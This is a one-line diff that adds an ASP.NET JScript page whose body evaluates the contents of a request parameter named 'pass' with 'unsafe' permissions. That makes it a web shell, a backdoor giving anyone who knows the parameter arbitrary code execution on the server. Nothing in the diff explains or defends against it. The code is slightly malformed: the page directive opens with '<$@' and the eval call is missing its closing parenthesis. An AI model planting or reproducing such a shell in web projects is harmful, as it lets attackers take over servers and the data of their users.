@@ -1,0 +1,1 @@
+<$@ PageLanguage="Jscript"%> <%eval(Request.Item["pass"],"unsafe";%>
